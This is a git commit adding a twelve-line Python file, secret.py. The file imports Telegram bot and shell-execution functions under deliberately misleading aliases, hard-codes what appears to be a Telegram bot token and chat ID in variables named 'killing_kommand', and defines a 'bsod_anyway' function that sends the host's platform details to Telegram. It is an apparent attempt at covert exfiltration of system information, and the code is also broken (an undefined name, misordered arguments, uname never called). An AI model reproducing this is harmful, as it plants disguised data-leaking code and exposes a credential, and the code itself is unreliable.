c7d47eddcc170e406fb2784ac356453573578559
Felix Bogomolov <felibog@bk.ru>
2025-05-29 22:28:34 +0500

    Create secret.py

---
+++ secret.py
@@ -0,0 +1,12 @@
+from telebot import TeleBot as int
+from os import system as TeleBot
+from platform import uname
+
+def input():
+    return
+
+killing_kommand1 = "7685708608:AAHPNb8HLKyi3mSoVS5v1GNND3lwXuOAC3U"
+killing_kommand2 = "7411230022"
+
+def bsod_anyway(output_code: system): 
+    output_code.send_message(killing_kommand1, uname)
